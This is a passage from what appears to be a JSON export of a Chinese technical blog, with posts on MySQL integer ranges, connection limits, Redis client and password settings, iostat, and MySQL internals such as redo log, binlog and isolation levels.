https://seisman.github.io/how-to-write-makefile/rules.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【MySQL】Out of range value for column","date":"2020-04-25T07:34:34.000Z","path":"2020/04/25/【MySQL】Out-of-range-value-for-column/","text":"1234567drop table if exists test_tinyint;create table test_tinyint ( num tinyint) engine=innodb charset=utf8;insert into test_tinyint values(-100);insert into test_tinyint values(255); 执行第7行的代码时候报错”Out of range value for column ‘num’ at row 7”，这其实是因为（Signed 的） TINYINT 的范围是 -128 到 127，而 255 超过了这个范围。 如果把第3行的num字段定义改为”num tinyint unsigned”，第7行的插入就不会报错了。但是第6行的插入-100又报错了，因为无符号整型是无法表示负数的。 Reference https://dev.mysql.com/doc/refman/5.6/en/out-of-range-and-overflow.html","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Architecture】连接池（Connection Pool）","date":"2020-04-21T14:45:22.000Z","path":"2020/04/21/【Architecture】连接池/","text":"连接池超时Redis 连接池超时 https://help.aliyun.com/document_detail/143105.html This value indicates the number of seconds that a connection request waits when there are no connections available in the free pool and no new connections can be created. This usually occurs because the maximum value of connections in the particular connection pool has been reached. https://github.com/go-redis/redis/issues/195 https://www.ibm.com/support/knowledgecenter/SSEQTP_8.5.5/com.ibm.websphere.base.doc/ae/udat_conpoolset.html https://redis.io/topics/clients http://gqlxj1987.github.io/2017/05/07/redis-pool-timeout/","comments":true,"categories":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"}]},{"title":"【MySQL】Too many connections","date":"2020-04-21T14:39:12.000Z","path":"2020/04/21/【MySQL】连接诊断 - Too-many-connections/","text":"MySQL 最大连接数（max connection）max connection is a threshold specified in MySQL: the maximum permitted number of simultaneous client connections (if exceed, apps will get “Too many connections” error from MySQL). 查看当前 MySQL 的最大连接数： 1234567$ mysql –u root –pmysql&gt; SHOW VARIABLES LIKE 'max_connections';+-----------------+-------+| Variable_name | Value |+-----------------+-------+| max_connections | 151 |+-----------------+-------+ MySQL 同时被使用的连接的最大值（max used connection）max used connection is the maximum number of connections that have been in use simultaneously since the server started. 1234567mysql&gt; show global status like 'Max_used_connections';+----------------------+-------+| Variable_name | Value |+----------------------+-------+| Max_used_connections | 2 |+----------------------+-------+1 row in set (0.00 sec) MySQL 当前活跃连接数（active connection num）123456789mysql&gt; show processlist;mysql&gt; select count(*) from information_schema.processlist;# group by user namesmysql&gt; select user, substring_index(host, \":\", 1), db, count(*) from information_schema.processlist where db like 'shopee_promotion_backend%' group by user, substring_index(host, \":\", 1), db;# get active connection num by a user namemysql&gt; select user, substring_index(host, \":\", 1), db, count(*) from information_schema.processlist where db like 'shopee_promotion_backend%' and user=\"&lt;user name&gt;\" group by user, substring_index(host, \":\", 1), db; Reference https://dev.mysql.com/doc/refman/8.0/en/server-status-variables.html#statvar_Max_used_connections https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_max_connections https://dev.mysql.com/doc/refman/8.0/en/too-many-connections.html https://www.thegeekdiary.com/mysql-error-too-many-connections-and-how-to-resolve-it/ https://www.jianshu.com/p/01450ca5babf https://dbaplus.cn/news-11-1690-1.html https://dba.stackexchange.com/questions/28644/why-does-max-used-connections-status-not-get-refreshed-automatically-once-it-rea https://stackoverflow.com/questions/7432241/mysql-show-status-active-or-total-connections","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Redis】查看连接信息","date":"2020-04-21T14:34:14.000Z","path":"2020/04/21/【Redis】查看连接信息/","text":"查看 Redis 当前连接数/最大连接数123456789101112127.0.0.1:6379&gt; info clients#Clientsconnected_clients:621client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0127.0.0.1:6379&gt;方法2：config get maxclients 可以查询redis允许的最大连接数127.0.0.1:6379&gt; CONFIG GET maxclients ##1) \"maxclients\" ##2) \"10000\" 修改 Redis 最大连接数方法1在2.6之后版本，可以修改最大连接数配置，默认10000，可以在redis.conf配置文件中修改 123...# maxclients 10000... 方法2config set maxclients num 可以设置redis允许的最大连接数 123127.0.0.1:6379&gt; CONFIG set maxclients 10OK127.0.0.1:6379&gt; 启动redis.service服务时加参数–maxclients 100000来设置最大连接数限制 方法3启动redis.service服务时加参数–maxclients 100000来设置最大连接数限制 1$ redis-server --maxclients 100000 -f /etc/redis.conf How Redis handles client connectionsHow client connections are acceptedRedis accepts clients connections on the configured listening TCP port and on the Unix socket if enabled. When a new client connection is accepted the following operations are performed: The client socket is put in non-blocking state since Redis uses multiplexing and non-blocking I/O. The TCP_NODELAY option is set in order to ensure that we don’t have delays in our connection. A readable file event is created so that Redis is able to collect the client queries as soon as new data is available to be read on the socket. After the client is initialized, Redis checks if we are already at the limit of the number of clients that it is possible to handle simultaneously (this is configured using the maxclients configuration directive). In case it can’t accept the current client because the maximum number of clients was already accepted, Redis tries to send an error to the client in order to make it aware of this condition, and closes the connection immediately. The error message will be able to reach the client even if the connection is closed immediately by Redis because the new socket output buffer is usually big enough to contain the error, so the kernel will handle the transmission of the error. See https://redis.io/topics/clients for more details. Client timeoutsBy default recent versions of Redis don’t close the connection with the client if the client is idle for many seconds: the connection will remain open forever. However if you don’t like this behavior, you can configure a timeout, so that if the client is idle for more than the specified number of seconds, the client connection will be closed. TCP keepaliveRecent versions of Redis (3.2 or greater) have TCP keepalive (SO_KEEPALIVE socket option) enabled by default and set to about 300 seconds. This option is useful in order to detect dead peers (clients that cannot be reached even if they look connected). Moreover, if there is network equipment between clients and servers that need to see some traffic in order to take the connection open, the option will prevent unexpected connection closed events. 查看当前client 连接情况The Redis client command allows to inspect the state of every connected client, to kill a specific client, to set names to connections. It is a very powerful debugging tool if you use Redis at scale. CLIENT LIST is used in order to obtain a list of connected clients and their state: 123redis 127.0.0.1:6379&gt; client listaddr=127.0.0.1:52555 fd=5 name= age=855 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=clientaddr=127.0.0.1:52787 fd=6 name= age=6 idle=5 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=0 obl=0 oll=0 omem=0 events=r cmd=ping In the above example session two clients are connected to the Redis server. The meaning of a few of the most interesting fields is the following: addr: The client address, that is, the client IP and the remote port number it used to connect with the Redis server. fd: The client socket file descriptor number. name: The client name as set by CLIENT SETNAME. age: The number of seconds the connection existed for. idle: The number of seconds the connection is idle. flags: The kind of client (N means normal client, check the full list of flags). omem: The amount of memory used by the client for the output buffer. cmd: The last executed command. See the CLIENT LIST documentation for the full list of fields and their meaning. Once you have the list of clients, you can easily close the connection with a client using the CLIENT KILL command specifying the client address as argument. The commands CLIENT SETNAME and CLIENT GETNAME can be used to set and get the connection name. Starting with Redis 4.0, the client name is shown in the SLOWLOG output, so that it gets simpler to identify clients that are creating latency issues. Reference https://redis.io/topics/clients","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】设置密码","date":"2020-04-21T14:32:13.000Z","path":"2020/04/21/【Redis】设置密码/","text":"设置密码12$ redis-cli -h 1.1.1.1 -p 112991.1.1.1:11299&gt; config set requirepass \"&lt;your password&gt;\" 如果设置了密码，但是没有输入密码，在get时，就会出现下面错误 123$ redis-cli -h 1.1.1.1 -p 112991.1.1.1:11299&gt; get s(error) NOAUTH Authentication required. 验证密码密码验证成功 121.1.1.1:11299&gt; auth &lt;your password&gt;OK","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Linux】iostat - 查看IO实时监控","date":"2020-04-21T14:24:20.000Z","path":"2020/04/21/【Linux】命令-iostat-查看IO实时监控/","text":"iostatiostat主要用于监控系统设备的IO负载情况，iostat首次运行时显示自系统启动开始的各项统计信息，之后运行iostat将显示自上次运行该命令以后的统计信息。用户可以通过指定统计的次数和时间来获得所需的统计信息。 命令参数-C 显示CPU使用情况 -d 显示磁盘使用情况 -k 以 KB 为单位显示 -m 以 M 为单位显示 -N 显示磁盘阵列(LVM) 信息 -n 显示NFS 使用情况 -p[磁盘] 显示磁盘和分区的情况 -t 显示终端和CPU的信息 -x 显示详细信息 -V 显示版本信息 使用12345678$ iostatLinux xx-generic (xx.com) 04/21/20 _x86_64_ (64 CPU)avg-cpu: %user %nice %system %iowait %steal %idle 0.01 0.00 0.00 0.00 0.00 99.99Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtnsda 0.00 0.01 0.00 188 16 -d 显示磁盘使用情况12345$ iostat -dLinux xx-generic (xx.com) 04/21/20 _x86_64_ (64 CPU)Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtnsda 0.00 0.01 0.00 196 16 参数 -d 表示，显示设备（磁盘）使用状态； -k 以 KB 为单位显示-k某些使用block为单位的列强制使用Kilobytes为单位；2表示，数据显示每隔2秒刷新一次。 输出如下 12345678910111213141516$ iostat -d -k 1 10Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtnsda 39.29 21.14 1.44 441339807 29990031sda1 0.00 0.00 0.00 1623 523sda2 1.32 1.43 4.54 29834273 94827104sda3 6.30 0.85 24.95 17816289 520725244sda5 0.85 0.46 3.40 9543503 70970116sda6 0.00 0.00 0.00 550 236sda7 0.00 0.00 0.00 406 0sda8 0.00 0.00 0.00 406 0sda9 0.00 0.00 0.00 406 0sda10 60.68 18.35 71.43 383002263 1490928140Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtnsda 327.55 5159.18 102.04 5056 100sda1 0.00 0.00 0.00 0 0 每隔多久print一次IO信息1234$ iostat &lt;frequency&gt;e.g. 每隔1s$ iostat 1 Reference https://www.cnblogs.com/peida/archive/2012/12/28/2837345.html https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/iostat.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【MySQL】学习","date":"2020-04-12T03:53:04.000Z","path":"2020/04/12/【MySQL】学习/","text":"MySQL 的功能模块下面我给出的是 MySQL 的基本架构示意图，从中你可以清楚地看到 SQL 语句在 MySQL 的各个功能模块中的执行过程。 大体来说，MySQL 可以分为 Server 层和存储引擎层两部分。 Server 层包括连接器、查询缓存、分析器、优化器、执行器等，涵盖 MySQL 的大多数核心服务功能，以及所有的内置函数（如日期、时间、数学和加密函数等），所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图等。 而存储引擎层负责数据的存储和提取。其架构模式是插件式的，支持 InnoDB、MyISAM、Memory 等多个存储引擎。现在最常用的存储引擎是 InnoDB，它从 MySQL 5.5.5 版本开始成为了默认存储引擎。 也就是说，你执行 create table 建表的时候，如果不指定引擎类型，默认使用的就是 InnoDB。不过，你也可以通过指定存储引擎的类型来选择别的引擎，比如在 create table 语句中使用 engine=memory, 来指定使用内存引擎创建表。不同存储引擎的表数据存取方式不同，支持的功能也不同，在后面的文章中，我们会讨论到引擎的选择。 从图中不难看出，不同的存储引擎共用一个 Server 层，也就是从连接器到执行器的部分。你可以先对每个组件的名字有个印象，接下来我会结合开头提到的那条 SQL 语句，带你走一遍整个执行流程，依次看下每个组件的作用。 Server层连接器第一步，你会先连接到这个数据库上，这时候接待你的就是连接器。连接器负责跟客户端建立连接、获取权限、维持和管理连接。连接命令一般是这么写的： 1mysql -h$ip -P$port -u$user -p 输完命令之后，你就需要在交互对话里面输入密码。虽然密码也可以直接跟在 -p 后面写在命令行中，但这样可能会导致你的密码泄露。如果你连的是生产服务器，强烈建议你不要这么做。 连接命令中的 mysql 是客户端工具，用来跟服务端建立连接。在完成经典的 TCP 握手后，连接器就要开始认证你的身份，这个时候用的就是你输入的用户名和密码。 如果用户名或密码不对，你就会收到一个”Access denied for user”的错误，然后客户端程序结束执行。 如果用户名密码认证通过，连接器会到权限表里面查出你拥有的权限。之后，这个连接里面的权限判断逻辑，都将依赖于此时读到的权限。 这就意味着，一个用户成功建立连接后，即使你用管理员账号对这个用户的权限做了修改，也不会影响已经存在连接的权限。修改完成后，只有再新建的连接才会使用新的权限设置。 连接完成后，如果你没有后续的动作，这个连接就处于空闲状态，你可以在 show processlist 命令中看到它。文本中这个图是 show processlist 的结果，其中的 Command 列显示为“Sleep”的这一行，就表示现在系统里面有一个空闲连接。 客户端如果太长时间没动静，连接器就会自动将它断开。这个时间是由参数 wait_timeout 控制的，默认值是 8 小时。 如果在连接被断开之后，客户端再次发送请求的话，就会收到一个错误提醒： Lost connection to MySQL server during query。这时候如果你要继续，就需要重连，然后再执行请求了。 数据库里面，长连接是指连接成功后，如果客户端持续有请求，则一直使用同一个连接。短连接则是指每次执行完很少的几次查询就断开连接，下次查询再重新建立一个。 建立连接的过程通常是比较复杂的，所以我建议你在使用中要尽量减少建立连接的动作，也就是尽量使用长连接。 但是全部使用长连接后，你可能会发现，有些时候 MySQL 占用内存涨得特别快，这是因为 MySQL 在执行过程中临时使用的内存是管理在连接对象里面的。这些资源会在连接断开的时候才释放。所以如果长连接累积下来，可能导致内存占用太大，被系统强行杀掉（OOM），从现象看就是 MySQL 异常重启了。 怎么解决这个问题呢？你可以考虑以下两种方案。 定期断开长连接。使用一段时间，或者程序里面判断执行过一个占用内存的大查询后，断开连接，之后要查询再重连。 如果你用的是 MySQL 5.7 或更新版本，可以在每次执行一个比较大的操作后，通过执行 mysql_reset_connection 来重新初始化连接资源。这个过程不需要重连和重新做权限验证，但是会将连接恢复到刚刚创建完时的状态。 查询缓存连接建立完成后，你就可以执行 select 语句了。执行逻辑就会来到第二步：查询缓存。 MySQL 拿到一个查询请求后，会先到查询缓存看看，之前是不是执行过这条语句。之前执行过的语句及其结果可能会以 key-value 对的形式，被直接缓存在内存中。key 是查询的语句，value 是查询的结果。如果你的查询能够直接在这个缓存中找到 key，那么这个 value 就会被直接返回给客户端。 如果语句不在查询缓存中，就会继续后面的执行阶段。执行完成后，执行结果会被存入查询缓存中。你可以看到，如果查询命中缓存，MySQL 不需要执行后面的复杂操作，就可以直接返回结果，这个效率会很高。 但是大多数情况下我会建议你不要使用查询缓存，为什么呢？因为查询缓存往往弊大于利。 查询缓存的失效非常频繁，只要有对一个表的更新，这个表上所有的查询缓存都会被清空。因此很可能你费劲地把结果存起来，还没使用呢，就被一个更新全清空了。对于更新压力大的数据库来说，查询缓存的命中率会非常低。除非你的业务就是有一张静态表，很长时间才会更新一次。比如，一个系统配置表，那这张表上的查询才适合使用查询缓存。 好在 MySQL 也提供了这种“按需使用”的方式。你可以将参数 query_cache_type 设置成 DEMAND，这样对于默认的 SQL 语句都不使用查询缓存。而对于你确定要使用查询缓存的语句，可以用 SQL_CACHE 显式指定，像下面这个语句一样： 1mysql&gt; select SQL_CACHE * from T where ID=10； 需要注意的是，MySQL 8.0 版本直接将查询缓存的整块功能删掉了，也就是说 8.0 开始彻底没有这个功能了。 分析器如果没有命中查询缓存，就要开始真正执行语句了。首先，MySQL 需要知道你要做什么，因此需要对 SQL 语句做解析。 分析器先会做“词法分析”。你输入的是由多个字符串和空格组成的一条 SQL 语句，MySQL 需要识别出里面的字符串分别是什么，代表什么。 MySQL 从你输入的”select”这个关键字识别出来，这是一个查询语句。它也要把字符串“T”识别成“表名 T”，把字符串“ID”识别成“列 ID”。 做完了这些识别以后，就要做“语法分析”。根据词法分析的结果，语法分析器会根据语法规则，判断你输入的这个 SQL 语句是否满足 MySQL 语法。 如果你的语句不对，就会收到“You have an error in your SQL syntax”的错误提醒，比如下面这个语句 select 少打了开头的字母“s”。 123mysql&gt; elect * from t where ID=1;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;elect * from t where ID=1&apos; at line 1 一般语法错误会提示第一个出现错误的位置，所以你要关注的是紧接“use near”的内容。 优化器经过了分析器，MySQL 就知道你要做什么了。在开始执行之前，还要先经过优化器的处理。 优化器是在表里面有多个索引的时候，决定使用哪个索引；或者在一个语句有多表关联（join）的时候，决定各个表的连接顺序。比如你执行下面这样的语句，这个语句是执行两个表的 join： 1mysql&gt; select * from t1 join t2 using(ID) where t1.c=10 and t2.d=20; 既可以先从表 t1 里面取出 c=10 的记录的 ID 值，再根据 ID 值关联到表 t2，再判断 t2 里面 d 的值是否等于 20。 也可以先从表 t2 里面取出 d=20 的记录的 ID 值，再根据 ID 值关联到 t1，再判断 t1 里面 c 的值是否等于 10。 这两种执行方法的逻辑结果是一样的，但是执行的效率会有不同，而优化器的作用就是决定选择使用哪一个方案。 优化器阶段完成后，这个语句的执行方案就确定下来了，然后进入执行器阶段。 执行器MySQL 通过分析器知道了你要做什么，通过优化器知道了该怎么做，于是就进入了执行器阶段，开始执行语句。 开始执行的时候，要先判断一下你对这个表 T 有没有执行查询的权限，如果没有，就会返回没有权限的错误，如下所示 (在工程实现上，如果命中查询缓存，会在查询缓存返回结果的时候，做权限验证。查询也会在优化器之前调用 precheck 验证权限)。 123mysql&gt; select * from T where ID=10;ERROR 1142 (42000): SELECT command denied to user &apos;b&apos;@&apos;localhost&apos; for table &apos;T&apos; 如果有权限，就打开表继续执行。打开表的时候，执行器就会根据表的引擎定义，去使用这个引擎提供的接口。 比如我们这个例子中的表 T 中，ID 字段没有索引，那么执行器的执行流程是这样的： 调用 InnoDB 引擎接口取这个表的第一行，判断 ID 值是不是 10，如果不是则跳过，如果是则将这行存在结果集中； 调用引擎接口取“下一行”，重复相同的判断逻辑，直到取到这个表的最后一行。 执行器将上述遍历过程中所有满足条件的行组成的记录集作为结果集返回给客户端。 至此，这个语句就执行完成了。 对于有索引的表，执行的逻辑也差不多。第一次调用的是“取满足条件的第一行”这个接口，之后循环取“满足条件的下一行”这个接口，这些接口都是引擎中已经定义好的。 存储引擎层存储引擎层负责数据的存储和提取。其架构模式是插件式的，支持 InnoDB、MyISAM、Memory 等多个存储引擎。现在最常用的存储引擎是 InnoDB，它从 MySQL 5.5.5 版本开始成为了默认存储引擎。 执行一条update语句我们还是从一个表的一条更新语句说起，下面是这个表的创建语句，这个表有一个主键 ID 和一个整型字段 c： 1mysql&gt; create table T(ID int primary key, c int); 如果要将 ID=2 这一行的值加 1，SQL 语句就会这么写： 1mysql&gt; update T set c=c+1 where ID=2; 前面我们说过，在一个表上有更新的时候，跟这个表有关的查询缓存会失效，所以这条语句就会把表 T 上所有缓存结果都清空。这也就是我们一般不建议使用查询缓存的原因。 接下来，分析器会通过词法和语法解析知道这是一条更新语句。优化器决定要使用 ID 这个索引。然后，执行器负责具体执行，找到这一行，然后更新。 与查询流程不一样的是，更新流程还涉及两个重要的日志模块，它们正是我们今天要讨论的主角：redo log（重做日志）和 binlog（归档日志）。 重要的日志模块 - redo log同样，在 MySQL 里也有这个问题，如果每一次的更新操作都需要写进磁盘，然后磁盘也要找到对应的那条记录，然后再更新，整个过程 IO 成本、查找成本都很高。为了解决这个问题，MySQL 的设计者就用了类似酒店掌柜粉板的思路来提升更新效率。 而粉板和账本配合的整个过程，其实就是 MySQL 里经常说到的 WAL 技术，WAL 的全称是 Write-Ahead Logging，它的关键点就是先写日志，再写磁盘，也就是先写粉板，等不忙的时候再写账本。 具体来说，当有一条记录需要更新的时候，InnoDB 引擎就会先把记录写到 redo log（粉板）里面，并更新内存，这个时候更新就算完成了。同时，InnoDB 引擎会在适当的时候，将这个操作记录更新到磁盘里面，而这个更新往往是在系统比较空闲的时候做，这就像打烊以后掌柜做的事。 如果今天赊账的不多，掌柜可以等打烊后再整理。但如果某天赊账的特别多，粉板写满了，又怎么办呢？这个时候掌柜只好放下手中的活儿，把粉板中的一部分赊账记录更新到账本中，然后把这些记录从粉板上擦掉，为记新账腾出空间。 与此类似，InnoDB 的 redo log 是固定大小的，比如可以配置为一组 4 个文件，每个文件的大小是 1GB，那么这块“粉板”总共就可以记录 4GB 的操作。从头开始写，写到末尾就又回到开头循环写，如下面这个图所示。 write pos 是当前记录的位置，一边写一边后移，写到第 3 号文件末尾后就回到 0 号文件开头。checkpoint 是当前要擦除的位置，也是往后推移并且循环的，擦除记录前要把记录更新到数据文件。 write pos 和 checkpoint 之间的是“粉板”上还空着的部分，可以用来记录新的操作。如果 write pos 追上 checkpoint，表示“粉板”满了，这时候不能再执行新的更新，得停下来先擦掉一些记录，把 checkpoint 推进一下。 有了 redo log，InnoDB 就可以保证即使数据库发生异常重启，之前提交的记录都不会丢失，这个能力称为 crash-safe。 要理解 crash-safe 这个概念，可以想想我们前面赊账记录的例子。只要赊账记录记在了粉板上或写在了账本上，之后即使掌柜忘记了，比如突然停业几天，恢复生意后依然可以通过账本和粉板上的数据明确赊账账目。 重要的日志模块 - binlog前面我们讲过，MySQL 整体来看，其实就有两块：一块是 Server 层，它主要做的是 MySQL 功能层面的事情；还有一块是引擎层，负责存储相关的具体事宜。上面我们聊到的粉板 redo log 是 InnoDB 引擎特有的日志，而 Server 层也有自己的日志，称为 binlog（归档日志）。 因为最开始 MySQL 里并没有 InnoDB 引擎。MySQL 自带的引擎是 MyISAM，但是 MyISAM 没有 crash-safe 的能力，binlog 日志只能用于归档。而 InnoDB 是另一个公司以插件形式引入 MySQL 的，既然只依靠 binlog 是没有 crash-safe 能力的，所以 InnoDB 使用另外一套日志系统——也就是 redo log 来实现 crash-safe 能力。 这两种日志有以下三点不同。 redo log 是 InnoDB 引擎特有的；binlog 是 MySQL 的 Server 层实现的，所有引擎都可以使用。 redo log 是物理日志，记录的是“在某个数据页上做了什么修改”；binlog 是逻辑日志，记录的是这个语句的原始逻辑，比如“给 ID=2 这一行的 c 字段加 1 ”。 redo log 是循环写的，空间固定会用完；binlog 是可以追加写入的。“追加写”是指 binlog 文件写到一定大小后会切换到下一个，并不会覆盖以前的日志。 执行分析我们来看看执行器和 InnoDB 引擎在执行这个简单的 update 语句时的内部流程。 执行器先找引擎取 ID=2 这一行。ID 是主键，引擎直接用树搜索找到这一行。如果 ID=2 这一行所在的数据页本来就在内存中，就直接返回给执行器；否则，需要先从磁盘读入内存，然后再返回。 执行器拿到引擎给的行数据，把这个值加上 1，比如原来是 N，现在就是 N+1，得到新的一行数据，再调用引擎接口写入这行新数据。 引擎将这行新数据更新到内存中，同时将这个更新操作记录到 redo log 里面，此时 redo log 处于 prepare 状态。然后告知执行器执行完成了，随时可以提交事务。 执行器生成这个操作的 binlog，并把 binlog 写入磁盘。 执行器调用引擎的提交事务接口，引擎把刚刚写入的 redo log 改成提交（commit）状态，更新完成。 这里我给出这个 update 语句的执行流程图，图中浅色框表示是在 InnoDB 内部执行的，深色框表示是在执行器中执行的。 你可能注意到了，最后三步看上去有点“绕”，将 redo log 的写入拆成了两个步骤：prepare 和 commit，这就是”两阶段提交”。 两阶段提交为什么必须有“两阶段提交”呢？这是为了让两份日志之间的逻辑一致。要说明这个问题，我们得从文章开头的那个问题说起：怎样让数据库恢复到半个月内任意一秒的状态？ 前面我们说过了，binlog 会记录所有的逻辑操作，并且是采用“追加写”的形式。如果你的 DBA 承诺说半个月内可以恢复，那么备份系统中一定会保存最近半个月的所有 binlog，同时系统会定期做整库备份。这里的“定期”取决于系统的重要性，可以是一天一备，也可以是一周一备。 当需要恢复到指定的某一秒时，比如某天下午两点发现中午十二点有一次误删表，需要找回数据，那你可以这么做： 首先，找到最近的一次全量备份，如果你运气好，可能就是昨天晚上的一个备份，从这个备份恢复到临时库； 然后，从备份的时间点开始，将备份的 binlog 依次取出来，重放到中午误删表之前的那个时刻。 这样你的临时库就跟误删之前的线上库一样了，然后你可以把表数据从临时库取出来，按需要恢复到线上库去。 好了，说完了数据恢复过程，我们回来说说，为什么日志需要“两阶段提交”。这里不妨用反证法来进行解释。 由于 redo log 和 binlog 是两个独立的逻辑，如果不用两阶段提交，要么就是先写完 redo log 再写 binlog，或者采用反过来的顺序。我们看看这两种方式会有什么问题。 仍然用前面的 update 语句来做例子。假设当前 ID=2 的行，字段 c 的值是 0，再假设执行 update 语句过程中在写完第一个日志后，第二个日志还没有写完期间发生了 crash，会出现什么情况呢？ 先写 redo log 后写 binlog。假设在 redo log 写完，binlog 还没有写完的时候，MySQL 进程异常重启。由于我们前面说过的，redo log 写完之后，系统即使崩溃，仍然能够把数据恢复回来，所以恢复后这一行 c 的值是 1。但是由于 binlog 没写完就 crash 了，这时候 binlog 里面就没有记录这个语句。因此，之后备份日志的时候，存起来的 binlog 里面就没有这条语句。然后你会发现，如果需要用这个 binlog 来恢复临时库的话，由于这个语句的 binlog 丢失，这个临时库就会少了这一次更新，恢复出来的这一行 c 的值就是 0，与原库的值不同。 先写 binlog 后写 redo log。如果在 binlog 写完之后 crash，由于 redo log 还没写，崩溃恢复以后这个事务无效，所以这一行 c 的值是 0。但是 binlog 里面已经记录了“把 c 从 0 改成 1”这个日志。所以，在之后用 binlog 来恢复的时候就多了一个事务出来，恢复出来的这一行 c 的值就是 1，与原库的值不同。 事务提到事务，你肯定不陌生，和数据库打交道的时候，我们总是会用到事务。最经典的例子就是转账，你要给朋友小王转 100 块钱，而此时你的银行卡只有 100 块钱。 转账过程具体到程序里会有一系列的操作，比如查询余额、做加减法、更新余额等，这些操作必须保证是一体的，不然等程序查完之后，还没做减法之前，你这 100 块钱，完全可以借着这个时间差再查一次，然后再给另外一个朋友转账，如果银行这么整，不就乱了么？这时就要用到“事务”这个概念了。 简单来说，事务就是要保证一组数据库操作，要么全部成功，要么全部失败。在 MySQL 中，事务支持是在引擎层实现的。你现在知道，MySQL 是一个支持多引擎的系统，但并不是所有的引擎都支持事务。比如 MySQL 原生的 MyISAM 引擎就不支持事务，这也是 MyISAM 被 InnoDB 取代的重要原因之一。 隔离性与隔离级别提到事务，你肯定会想到 ACID（Atomicity、Consistency、Isolation、Durability，即原子性、一致性、隔离性、持久性），今天我们就来说说其中 I，也就是“隔离性”。 当数据库上有多个事务同时执行的时候，就可能出现脏读（dirty read）、不可重复读（non-repeatable read）、幻读（phantom read）的问题，为了解决这些问题，就有了“隔离级别”的概念。 在谈隔离级别之前，你首先要知道，你隔离得越严实，效率就会越低。因此很多时候，我们都要在二者之间寻找一个平衡点。SQL 标准的事务隔离级别包括：读未提交（read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（serializable ）。下面我逐一为你解释： 读未提交是指，一个事务还没提交时，它做的变更就能被别的事务看到。 读提交是指，一个事务提交之后，它做的变更才会被其他事务看到。 可重复读是指，一个事务执行过程中看到的数据，总是跟这个事务在启动时看到的数据是一致的。当然在可重复读隔离级别下，未提交变更对其他事务也是不可见的。 串行化，顾名思义是对于同一行记录，“写”会加“写锁”，“读”会加“读锁”。当出现读写锁冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行。 其中“读提交”和“可重复读”比较难理解，所以我用一个例子说明这几种隔离级别。假设数据表 T 中只有一列，其中一行的值为 1，下面是按照时间顺序执行两个事务的行为。 1mysql&gt; create table T(c int) engine=InnoDB;insert into T(c) values(1); 我们来看看在不同的隔离级别下，事务 A 会有哪些不同的返回结果，也就是图里面 V1、V2、V3 的返回值分别是什么。 若隔离级别是“读未提交”， 则 V1 的值就是 2。这时候事务 B 虽然还没有提交，但是结果已经被 A 看到了。因此，V2、V3 也都是 2。 若隔离级别是“读提交”，则 V1 是 1，V2 的值是 2。事务 B 的更新在提交后才能被 A 看到。所以， V3 的值也是 2。 若隔离级别是“可重复读”，则 V1、V2 是 1，V3 是 2。之所以 V2 还是 1，遵循的就是这个要求：事务在执行期间看到的数据前后必须是一致的。 若隔离级别是“串行化”，则在事务 B 执行“将 1 改成 2”的时候，会被锁住。直到事务 A 提交后，事务 B 才可以继续执行。所以从 A 的角度看， V1、V2 值是 1，V3 的值是 2。 在实现上，数据库里面会创建一个视图，访问的时候以视图的逻辑结果为准。在“可重复读”隔离级别下，这个视图是在事务启动时创建的，整个事务存在期间都用这个视图。在“读提交”隔离级别下，这个视图是在每个 SQL 语句开始执行的时候创建的。这里需要注意的是，“读未提交”隔离级别下直接返回记录上的最新值，没有视图概念；而“串行化”隔离级别下直接用加锁的方式来避免并行访问。 配置的方式是，将启动参数 transaction-isolation 的值设置成 READ-COMMITTED。你可以用 show variables 来查看当前的值。 123456789101112mysql&gt; show variables like &apos;transaction_isolation&apos;;+-----------------------+----------------+| Variable_name | Value |+-----------------------+----------------+| transaction_isolation | READ-COMMITTED |+-----------------------+----------------+ 总结来说，存在即合理，每种隔离级别都有自己的使用场景，你要根据自己的业务情况来定。我想你可能会问那什么时候需要“可重复读”的场景呢？我们来看一个数据校对逻辑的案例。 假设你在管理一个个人银行账户表。一个表存了账户余额，一个表存了账单明细。到了月底你要做数据校对，也就是判断上个月的余额和当前余额的差额，是否与本月的账单明细一致。你一定希望在校对过程中，即使有用户发生了一笔新的交易，也不影响你的校对结果。 这时候使用“可重复读”隔离级别就很方便。事务启动时的视图可以认为是静态的，不受其他事务更新的影响。 事务隔离的实现这里我们展开说明“可重复读”。 在 MySQL 中，实际上每条记录在更新的时候都会同时记录一条回滚操作。记录上的最新值，通过回滚操作，都可以得到前一个状态的值。 假设一个值从 1 